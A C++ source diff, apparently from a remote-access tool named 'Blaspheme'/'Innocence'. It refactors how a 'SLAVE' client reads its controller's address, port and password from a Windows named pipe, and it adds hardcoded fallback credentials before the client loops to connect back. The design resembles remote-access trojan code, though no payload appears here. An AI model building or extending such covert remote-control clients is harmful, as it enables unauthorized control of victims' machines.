@@ -2,7 +2,7 @@
 HANDLE threadHandle;
 
 #include <blaspheme/protocol/ConnectionInfo.hpp>
-#include <blaspheme/Blaspheme.hpp>
+#include <Innocence.hpp>
 
 #include <common/Log.hpp>
 
@@ -19,32 +19,40 @@ using namespace System;
 // pour ce faire, on utilise les "pipe" à la windows (IPC)
 Blaspheme::ConnectionInfo getConnectionInfo()
 {
-	Network::Pipe pipe;
-    Blaspheme::ConnectionInfo infos;
-    if(pipe.connect(PIPE_NAME))
-    {
+	Blaspheme::ConnectionInfo info;
+	try
+	{
+		Network::Pipe pipe;
+		pipe.connect(Innocence::PIPE_NAME);
 		char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
-        pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
-        std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+		pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+		std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
 		size_t end = buffer.find_last_of(MARKER);
 		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);
 
-        std::string port_buffer;
-        std::istringstream iss(buffer);
+		std::string port_buffer;
+		std::istringstream iss(buffer);
 
-        std::getline( iss, infos.ip, SEPERATOR );
-        std::getline( iss, port_buffer, SEPERATOR );
-        std::getline( iss, infos.name, SEPERATOR );
-        std::getline( iss, infos.password, SEPERATOR );
+		std::getline( iss, info.ip, SEPERATOR );
+		std::getline( iss, port_buffer, SEPERATOR );
+		std::getline( iss, info.name, SEPERATOR );
+		std::getline( iss, info.password, SEPERATOR );
 
-        fromString(port_buffer, infos.port);
-        pipe.disconnect();
-    }
-	else
-	{
-		throw Common::Exception("getConnectionInfo() : unable to connect to pipe");
+		fromString(port_buffer, info.port);
+		pipe.disconnect();
 	}
-	return infos;
+	catch(Network::PipeException&)
+	{
+//#ifndef INNOCENCE_DEBUG
+//		throw;
+//#else
+		info.ip = "127.0.0.1";
+		info.port = 80;
+		info.password = "crunch";
+		info.name = "default";
+//#endif
+	}
+	return info;
 }
 
 DWORD WINAPI run(void)
@@ -54,18 +62,9 @@ DWORD WINAPI run(void)
 		LOG.setHeader("SLAVE");
 		LOG.addObserver(new Common::LogToConsole);
 		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
-		Blaspheme::ConnectionInfo info = getConnectionInfo();
-		/*
-		Blaspheme::ConnectionInfo info;
-		info.ip = "127.0.0.1";
-		info.port = 80;
-		info.password = "crunch";
-		info.name = "default";
-		*/
-	    
+		Blaspheme::ConnectionInfo info = getConnectionInfo();	    
 		
 		SlaveCore slave(info);
-
 		LOG << GetElevationType();
 		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
 		while(!slave.exiting())
